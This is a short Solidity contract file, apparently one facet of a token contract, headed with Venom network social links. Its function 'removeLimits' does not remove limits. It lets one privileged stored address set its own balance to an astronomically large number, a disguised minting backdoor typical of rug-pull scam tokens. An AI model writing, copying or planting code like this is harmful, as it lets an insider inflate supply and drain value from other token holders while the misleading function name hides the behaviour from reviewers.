/*  
   * SPDX-License-Identifier: MIT

     // Telegram:  https://t.me/Venom
    // Twitter: https://twitter.com/Venom_network_
    // Website: https://venom.network/
    // Medium:  https://medium.com/@venom.foundation
    // Discord:  https://discord.com/invite/E5JdCbFFW7

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
